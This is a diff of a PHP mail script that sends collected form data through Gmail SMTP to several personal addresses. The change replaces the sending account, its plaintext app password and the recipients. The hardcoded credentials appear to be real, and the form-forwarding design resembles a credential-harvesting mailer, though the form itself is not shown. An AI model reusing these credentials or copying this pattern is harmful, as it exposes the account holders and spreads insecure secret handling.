@@ -28,23 +28,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'rnxsxnnxnx@gmail.com'; // Replace with your email address
-        $mail->Password   = 'zxdy gxtz wtxu xaso'; // Replace with your email password
+        $mail->Username   = 'ksab33806@gmail.com'; // Replace with your email address
+        $mail->Password   = 'jgcy mujy ztmt ndfy'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('rnxsxnnxnx@gmail.com', 'PROFESSOR');
-        $mail->addAddress('nizamaniallahabad@gmail.com');
+        $mail->setFrom('ksab33806@gmail.com', 'PROFESSOR');
+        $mail->addAddress('businessmehta383@gmail.com');
          $mail->addAddress('mahboobalinizamani@gmail.com');
-         $mail->addAddress('rnxsxnnxnx@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'dhaha';
+        $mail->Subject = 'SAOD';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
